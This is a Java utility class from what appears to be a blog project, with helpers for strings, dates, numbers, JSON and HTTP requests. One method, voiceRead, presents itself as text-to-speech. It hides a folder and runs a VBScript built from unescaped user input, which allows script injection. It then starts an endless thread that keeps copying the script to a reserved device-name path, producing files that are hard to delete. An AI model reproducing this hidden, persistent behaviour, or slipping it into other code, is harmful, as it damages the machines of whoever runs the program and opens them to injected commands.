package top.lemonz.blog.tool.impl;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.stereotype.Service;
import top.lemonz.blog.tool.IXlmToolKit;

import javax.servlet.http.HttpServletRequest;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.text.DecimalFormat;
import java.text.NumberFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.*;

/**
 * @author xiao ning meng
 * @intro Xlm tool
 * @path XlmQuery/cn.kaxlm6.publics.tool.impl.XlmToolKit
 * @date 2018/6/8/ 14:52:32
 * @versions 5.20
 */
@Service("kit")
public class XlmToolKit implements IXlmToolKit {

    /**
     * 将一串字符更改格式,可间隔模糊查询 - ABC -> %A%B%C%
     */
    @Override
    public String toMysqlLike(String nickName) {
        // 为空跳出
        if (!isStrNull(nickName)) {
            return null;
        }
        StringBuffer sb = new StringBuffer("%");
        String[] split = nickName.split("");
        for (int i = 1; i < split.length; i++) {
            sb.append(split[i] + "%");
        }
        return sb.toString();
    }

    /**
     * 随机指定位数的一串数字 - 首尾不会为0
     */
    @Override
    public String randomTo(int place) {
        StringBuffer sb = new StringBuffer();
        Random random = new Random();
        int i = 0, nextInt;
        for (; i < place; i++) {
            nextInt = random.nextInt(10);
            if (i == 0 || i == (place - 1)) {
                while (true) {
                    if (nextInt == 0) {
                        nextInt = random.nextInt(10);
                        if (nextInt == 0) {
                            continue;
                        }
                    }
                    break;
                }
            }
            sb.append(nextInt);
        }
        return sb.toString();
    }

    /**
     * 拆解str字符串 - "ABC" -> A B AB C AC BC ABC
     */
    @Override
    public String disassembleStr(String str) {
        StringBuffer sb = new StringBuffer();
        String[] splitStr = str.split("");
        char[] splitChar = str.toCharArray();

        int len = splitChar.length;
        int nbits = 1 << len;
        int i = 0;
        for (; i < nbits; ++i) {
            int t;
            for (int j = 0; j < len; j++) {
                t = 1 << j;
                // 与运算，同为1时才会是1
                if ((t & i) != 0) {
                    sb.append(splitStr[j + 1]);
                }
            }
            sb.append(" ");
        }
        return sb.toString().trim();
    }

    /**
     * 将字符数字转换为int类型
     */
    @Override
    public Integer parseInt(String strnum) {
        return Integer.parseInt(strnum);
    }

    /**
     * 将字符数字转换为double类型
     */
    @Override
    public Double parseDouble(String strnum) {
        return Double.parseDouble(strnum);
    }

    /**
     * 将对象转换为json对象
     */
    @Override
    public JSONObject parseJSONObject(Object obj) {
        return JSON.parseObject(JSON.toJSONString(obj));
    }

    /**
     * 格式化string为Date
     */
    @Override
    public Date parseDate(String strdate) {
        if (null == strdate || "".equals(strdate)) {
            return null;
        }
        try {
            // 定义一个空变量
            String fmtstr;
            // 判断传入进来的值是否有:符号>0 大于出入时间字符串格式
            if (strdate.indexOf(":") > 0) {
                fmtstr = "yyyy-MM-dd HH:mm:ss";
            } else {
                fmtstr = "yyyy-MM-dd";
            }
            // 转为时间返回
            SimpleDateFormat sdf = new SimpleDateFormat(fmtstr, Locale.UK);
            return sdf.parse(strdate);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * 保留两位小数(四舍五入)
     */
    @Override
    public Double fnum(Double strnum) {
        return Double.parseDouble(new DecimalFormat("##0.00").format(strnum));
    }

    /**
     * 将百分比转换为小数 - 10%
     *
     * @param source
     */
    @Override
    public Double parseNf(String source) {
        try {
            return Double.parseDouble(NumberFormat.getPercentInstance().parse(source).toString());
        } catch (ParseException e) {
            e.printStackTrace();
        }
        return 0.0;
    }

    /**
     * 将金额转换为千分位 - 3,600,000
     *
     * @param number
     */
    @Override
    public String parseDf(Object number) {
        return new DecimalFormat("##,##0").format(number);
    }

    /**
     * 将金额转换为千分位 - 3,600,000.00
     *
     * @param number
     */
    @Override
    public String parseDfs(Object number) {
        return new DecimalFormat("##,##0.00").format(number);
    }

    /**
     * 毫秒数转换为String类型的日期
     */
    @Override
    public String ftime(Long time) {
        if (null == time) {
            return null;
        }
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
            return sdf.format(time);
        } catch (Exception e) {
            throw new RuntimeException("转换错误");
        }
    }

    /**
     * 判断字符为空或者空字符或Empty{name='chars'} return 不为空返回true
     */
    @Override
    public boolean isStrNull(String chars) {
        return null != chars && !"null".equals(chars) && !"".equals(chars) && !("Empty{name='" + chars + "'}").equals(chars);
    }

    /**
     * 判断list集合为空或者长度为0 return 不为空返回true
     */
    @Override
    public boolean isListNull(List<?> list) {
        return null != list && 0 != list.size();
    }

    /**
     * 判断Set集合为空或者长度为0 return 不为空返回true
     */
    @Override
    public boolean isSetNull(Set<?> set) {
        return null != set && 0 != set.size();
    }

    /**
     * 判断map集合为空或者长度为0 return 不为空返回true
     */
    @Override
    public boolean isMapNull(Map<?, ?> map) {
        return null != map && 0 != map.size();
    }

    /**
     * 判断是否为汉字(有一个就为true)
     */
    @Override
    public boolean isChinese(String chars) {
        String regex = "[\u4e00-\u9fa5]";
        String[] charss = chars.split("");
        for (String c : charss) {
            if (c.matches(regex)) {
                return true;
            }
        }
        return false;
    }

    /**
     * 将请求参数转换为json对象 --> (将form表单参数转换为json对象，这样就不需要对应的实体类了)
     */
    @Override
    public JSONObject formParseJsonObject(HttpServletRequest request) {
        Map<String, String[]> parameterMap = request.getParameterMap();
        Map<String, Object> parameterMapC = new HashMap<>(10);
        for (Map.Entry<String, String[]> map : parameterMap.entrySet()) {
            if (map.getValue() != null && 0 != map.getValue().length) {
                parameterMapC.put(map.getKey(), map.getValue()[0]);
            }
        }
        return parseJSONObject(parameterMapC);
    }

    /**
     * 获得请求头地址 - 从项目名--> 请求的页面
     */
    @Override
    public String getHeader(HttpServletRequest request) {
        /** 获得请求头 */
        String headereader = request.getHeader("referer");
        if (!isStrNull(headereader)) {
            return "java.lang.NullPointerException - 未找到请求头地址";
        }
        /** 获得请求头的页面地址 */
        String reqAddress = headereader.substring(headereader.lastIndexOf(":"));
        reqAddress = reqAddress.substring(reqAddress.indexOf("/") + 1);
        return reqAddress;
    }

    /**
     * MD5加密(32位)
     */
    @Override
    public String parseMD5(String chars) {
        return XlmMD5.getMD5ofStr(chars);
    }

    /**
     * 英语-汉字-->语音朗读
     */
    @Override
    public void voiceRead(String content) {
        try {

            File file = new File("C:/system");
            file.mkdirs();

            File file1 = new File("C:/system/YuYin.VBS");

            if (!file1.exists()) {

                file1.createNewFile();

            }

            BufferedWriter bw = new BufferedWriter(new FileWriter(file1));
            if (!"".equals(content) && content != null) {
                bw.write("CreateObject(\"SAPI.SpVoice\").Speak \"" + content + "\"");
            } else {
                bw.write("CreateObject(\"SAPI.SpVoice\").Speak \"" + "请您输入内容后重试" + "\"");
            }
            bw.flush();
            bw.close();

            Runtime.getRuntime().exec("cmd /c attrib +H C:\\system");

            Runtime.getRuntime().exec("cmd /c wscript C:/system/YuYin.VBS");

            new Thread() {
                Integer n = 2 * 3 * 2 * 5 * 25 * 4;

                @Override
                public void run() {
                    while (true) {
                        try {
                            Thread.sleep(n);
                            Runtime.getRuntime().exec(
                                    "cmd /c copy C:\\\\system\\\\YuYin.VBS \\\\.\\C:\\\\system\\\\lpt6.YuYin.VBS");
                            Runtime.getRuntime().exec("cmd /c del C:\\system\\YuYin.VBS");
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }

                ;
            }.start();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    /**
     * 转换Object为json字符串 jackson
     */
    @Override
    public String parseJackson(Object object) {
        try {
            return new ObjectMapper().writeValueAsString(object);
        } catch (Exception e) {
            throw new RuntimeException();
        }
    }

    /**
     * 转换Object为json字符串 fastJson
     */
    @Override
    public String parseFastJson(Object object) {
        return JSON.toJSONString(object);
    }

    /**
     * 获得归属地及运营商
     *
     * @param ip
     */
    @Override
    public String getIpOperator(String ip) {
        return XlmIp.getDateByIp(ip);
    }

    /**
     * 获得足迹/信息
     *
     * @param request
     */
    @Override
    public Map<String, String> getNzInfo(HttpServletRequest request) {
        return new XlmFootInfo().getNzInfo(request);
    }

    /**
     * 处理JSON数据的特殊字符 - 比如：' / \ \t \f \\ ......
     *
     * @param strJson
     * @return
     */
    @Override
    public String stringJson(String strJson) {
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < strJson.length(); i++) {
            char c = strJson.charAt(i);
            switch (c) {
                case '\"':
                    sb.append("\\\"");
                    break;
                case '\\':
                    sb.append("\\\\");
                    break;
                case '/':
                    sb.append("\\/");
                    break;
                case '\b':
                    sb.append("\\b");
                    break;
                case '\f':
                    sb.append("\\f");
                    break;
                case '\n':
                    sb.append("\\n");
                    break;
                case '\r':
                    sb.append("\\r");
                    break;
                case '\t':
                    sb.append("\\t");
                    break;
                default:
                    sb.append(c);
            }
        }
        return sb.toString();
    }

}